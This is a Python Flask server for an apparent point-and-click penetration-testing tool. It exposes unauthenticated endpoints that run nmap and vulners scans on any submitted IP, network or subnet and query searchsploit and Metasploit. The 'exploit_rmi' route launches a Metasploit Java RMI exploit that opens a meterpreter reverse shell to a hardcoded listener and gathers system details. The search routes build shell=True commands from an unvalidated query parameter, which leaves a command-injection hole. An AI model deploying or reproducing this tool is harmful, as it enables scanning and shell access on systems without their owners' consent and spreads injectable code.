from flask import Flask, request, jsonify
from flask_cors import CORS
import subprocess
import ipaddress
import os
import json
import logging
import re

app = Flask(__name__)
CORS(app)

ArrOutput = []

logging.basicConfig(level=logging.INFO)

# Path to the JSON file containing vulnerability information
VULNERABILITY_DATA_FILE = '/home/kali/Desktop/cve_open_ports.json'

# Load vulnerability data from the JSON file
def load_vulnerability_data():
    if not os.path.exists(VULNERABILITY_DATA_FILE):
        return []  # Return an empty list if the file doesn't exist

    with open(VULNERABILITY_DATA_FILE, 'r') as file:
        data = json.load(file)
        logging.info("Loaded vulnerabsility data: %s", data)  # Log the loaded data
        return data

# New endpoint to get vulnerabilities based on an array of ports and versions
@app.route('/get_vulnerabilities', methods=['POST'])
def get_vulnerabilities():
    logging.info("Received request for vulnerabilities")
    data = request.get_json()
    logging.info("Data received: %s", data)

    ports_and_versions = data.get('ports_and_versions', [])

    # Load vulnerability data
    vulnerability_data = load_vulnerability_data()
    logging.info("Loaded vulnerability data: %s", vulnerability_data)

    results = []

    for item in ports_and_versions:
        try:
            port = int(item.get('port'))  # Convert port to integer
        except (ValueError, TypeError):
            logging.error("Invalid port value: %s", item.get('port'))
            continue  # Skip to the next item if port is invalid

        version = item.get('version')
        logging.info("Checking vulnerabilities for port: %d, version: %s", port, version)

        # Ensure port in vulnerability_data is also treated as an integer
        vulnerability_info = next((v for v in vulnerability_data if int(v['port']) == port and v['version'] == version), None)

        if vulnerability_info:
            results.append({
                'port': port,
                'version': version,
                'cve_id': vulnerability_info['cve_id'],
                'cve_score': vulnerability_info['cve_score'],
                'description': vulnerability_info['description'],
            })
            logging.info("Found vulnerability: %s", vulnerability_info)
        else:
            results.append({
                'port': port,
                'version': version,
                'cve_id': 'N/A',
                'cve_score': 'N/A',
                'description': 'No known vulnerabilities.',
            })
            logging.info("No known vulnerabilities for port: %d, version: %s", port, version)

    response = jsonify(results)
    response.headers.add("Access-Control-Allow-Origin", "*")  # Allow CORS
    return response




# Function to parse nmap output
def parse_nmap_output(raw_output):
    # Parse the raw Nmap output to extract IP, host status, and port status
    output = []
    lines = raw_output.split('\n')
    current_ip = None
    host_status = "down"  # Default to down
    open_port_found = False  # To track if we found an open port

    for line in lines:
        line = line.strip()

        if "Nmap scan report for" in line:
            if open_port_found:  # If an open port was found, break out early
                break
            current_ip = line.split()[-1]  # Get the new IP address
            host_status = "down"  # Reset for new IP
            port_status = None  # Reset port status

        if "Host is up" in line:
            host_status = "up"  # Update host status to up if found

        if "open" in line:
            port_status = "open"
            open_port_found = True  # Mark that an open port was found
            output.append({
                "ip": current_ip,
                "hostStatus": host_status,
                "portStatus": port_status
            })
            break  # Exit the loop as soon as we find an open port

    if not open_port_found:  # No open ports, so send back default information
        output.append({
            "ip": current_ip,
            "hostStatus": host_status,
            "portStatus": "No open ports found"
        })

    return output

# NMAP Scanning device with optimized version function start
@app.route('/scan-device-version', methods=['POST'])
def scan_device_version():
    data = request.get_json()
    if not data or 'ip' not in data:
        return jsonify({"error": "Invalid input, 'ip' is required."}), 400

    ip = data['ip']
    # Validate IP format
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        return jsonify({"error": "Invalid IP address format."}), 400

    # Run optimized Nmap command for faster detection
    try:
        # Only scan the top 100 common ports with version detection
        result = subprocess.check_output(
            ['nmap', '-sV', '--top-ports', '100', '--version-intensity', '1', ip],
            universal_newlines=True
        )
        return jsonify(output=result)  # Directly return the raw output
    except subprocess.CalledProcessError as e:
        return jsonify(output=str(e)), 500

# NMAP Scanning device function start
@app.route('/scan-device', methods=['POST'])
def scan_device():
    data = request.get_json()
    if not data or 'ip' not in data:
        return jsonify({"error": "Invalid input, 'ip' is required."}), 400

    ip = data['ip']
    # Add IP format validation
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        return jsonify({"error": "Invalid IP address format."}), 400

    # Proceed with running the Nmap command
    try:
        result = subprocess.check_output(['nmap', '-sS', '-p', '1-65535', ip], universal_newlines=True)
        output = parse_nmap_output(result)
        return jsonify(output=output)
    except Exception as e:
        return jsonify(output=str(e)), 500

# NMAP Scanning network function start
@app.route('/scan-network', methods=['POST'])
def scan_network():
    data = request.get_json()
    network = data.get("network")

    if not network:
        return jsonify({"error": "Network address is missing"}), 400

    print(f"Scanning network: {network}")

    try:
        result = subprocess.run(
            ["nmap", "-p-", "-sS", "-n", network],  # Scan all ports
            capture_output=True,
            text=True,
            timeout=150
        )

        if result.returncode != 0:
            return jsonify({"error": "Nmap scan failed", "details": result.stderr}), 500

        output = result.stdout
        ArrOutput.append(output)

        ip_addresses = []
        lines = output.split('\n')
        for line in lines:
            if "Nmap scan report for" in line:
                parts = line.split()
                if len(parts) > 4:
                    ip_address = parts[4]
                    ip_addresses.append(ip_address)

        if "open" in output:
            if ip_addresses:
                response = {
                    "type": "scan-network",
                    "message": "Several hosts detected with open ports.",
                    "ip_addresses": ip_addresses,
                    "output": output
                }
            else:
                response = {
                    "type": "scan-network",
                    "message": "Hosts with open ports detected, but IP addresses could not be determined.",
                    "output": output
                }
        else:
            response = {
                "type": "scan-network",
                "message": "No open ports detected.",
                "output": output
            }

        return jsonify(response)

    except subprocess.TimeoutExpired:
        return jsonify({"error": "The network scan is taking too long and has timed out."}), 408
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# NMAP Scanning subnet function start
@app.route('/scan-subnet', methods=['POST'])
def scan_subnet():
    data = request.get_json()
    ip = data.get("ip")
    subnet = data.get("subnet")

    if not ip or not subnet:
        return jsonify({"error": "IP address and subnet are required."}), 400

    try:
        # Validate the subnet input
        network = ipaddress.ip_network(subnet, strict=False)
        print(f"Starting scan on subnet {subnet}...")

        results = []

        for ip in network.hosts():
            print(f"\nScanning device: {ip}")
            result = subprocess.run(["nmap", "-p-", "-sS", "-n", str(ip)], capture_output=True, text=True)  # Scan all ports
            output = result.stdout

            results.append({
                "ip": str(ip),
                "output": output
            })

        response = {
            "type": "scan-subnet",
            "results": results
        }

        return jsonify(response)

    except ValueError:
        return jsonify({"error": "Invalid subnet input. Please enter a valid subnet (e.g., 192.168.1.0/24)."}), 400
    except subprocess.TimeoutExpired:
        return jsonify({"error": "The subnet scan is taking too long and has timed out."}), 408
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Vulnerability scan function
@app.route('/vul-scan', methods=['POST'])
def vul_scan():
    data = request.get_json()
    target_ip = data.get("target_ip")
    try:
        print(f"Running vulnerability scan on {target_ip}...")
        command = ["sudo", "nmap", "-sV", "-p21-8000", "--script", "vulners", target_ip]
        result = subprocess.run(command, capture_output=True, text=True)
        output = result.stdout

        return jsonify(parse_vulnerability_summary(output))

    except subprocess.CalledProcessError as e:
        return jsonify({"error": f"An error occurred while running the vulnerability scan: {str(e)}"})

# Parse vulnerability summary
def parse_vulnerability_summary(output):
    lines = output.split('\n')
    current_port = None
    port_summary = {}

    for line in lines:
        if "/tcp" in line and "open" in line:
            parts = line.split()
            current_port = parts[0]
            service_info = ' '.join(parts[2:])
            port_summary[current_port] = {'service': service_info, 'vulnerabilities': []}

        if "CVE-" in line:
            vuln_info = line.strip()
            if current_port:
                port_summary[current_port]['vulnerabilities'].append(vuln_info)

    summary = []
    for port, details in port_summary.items():
        summary.append({
            "port": port,
            "service": details['service'],
            "vulnerabilities": details['vulnerabilities'] or "No vulnerabilities found."
        })

    return {"vulnerability_summary": summary}

# SearchSploit Start
@app.route('/searchSploit', methods=['GET'])
def search():
    service = request.args.get('service')
    if service:
        command = f"searchsploit {service}"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        # Check if the command executed successfully
        if result.returncode == 0:
            # Return the command output as JSON
            return jsonify({"output": result.stdout.strip(), "error": None})
        else:
            # Return error details if command fails
            return jsonify({"output": None, "error": result.stderr.strip()})
    return jsonify({"output": None, "error": "No service specified."}), 400


# Metasploit Search Start
@app.route('/searchmsf', methods=['GET'])
def searchmsf():
    service = request.args.get('service')

    if service:
        # Check if "grmiregistry" is part of the service name
        if "grmiregistry" in service.lower():
            service = "java rmi"

        # Initialize Metasploit command
        init_command = f"msfconsole -x 'search {service}; exit'"

        # Log the command for debugging
        app.logger.info(f"Executing command: {init_command}")

        # Execute the Metasploit command
        result = subprocess.run(init_command, shell=True, capture_output=True, text=True)

        # Check if the command executed successfully
        if result.returncode == 0:
            # Return the command output as JSON
            return jsonify({"output": result.stdout.strip(), "error": None})
        else:
            # Return error details if command fails
            return jsonify({"output": None, "error": result.stderr.strip()})

    return jsonify({"output": None, "error": "No service specified."}), 400


@app.route('/exploit_rmi', methods=['POST'])
def exploit_rmi():
    data = request.json
    ip_address = data.get("ipAddress")
    rport = 1099  # Default port for Java RMI
    lhost = "192.168.5.102"  # Flask server's IP
    lport = 4444  # Listener port for reverse shell

    # Validate IP address format
    if ip_address and re.match(r'^\d{1,3}(\.\d{1,3}){3}$', ip_address):
        # Build the Metasploit command for the exploit without exit
        exploit_command = (
            f"msfconsole -x 'use multi/misc/java_rmi_server; "
            f"set RHOST {ip_address}; set RPORT {rport}; "
            f"set LHOST {lhost}; set LPORT {lport}; "
            f"set PAYLOAD java/meterpreter/reverse_tcp; run; "
            f"background; sessions -i 1; sysinfo; ifconfig; exit;'"
        )

        # Log the command for debugging
        app.logger.info(f"Executing command: {exploit_command}")

        try:
            # Execute the Metasploit command
            result = subprocess.run(exploit_command, shell=True, capture_output=True, text=True)

            # Check if the command executed successfully
            if result.returncode == 0:
                # Log output for debugging
                output = result.stdout.strip()
                app.logger.info(f"Exploit Output: {output}")

                return jsonify({"output": output, "error": None})
            else:
                return jsonify({"output": None, "error": result.stderr.strip()}), 500

        except Exception as e:
            app.logger.error(f"An error occurred: {str(e)}")
            return jsonify({"output": None, "error": str(e)}), 500

    return jsonify({"output": None, "error": "No valid IP address specified."}), 400






# Exiting the program
@app.route('/exit', methods=['POST'])
def exit_program():
    print("Exiting the Program.")
    return jsonify({"outputs": ArrOutput})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
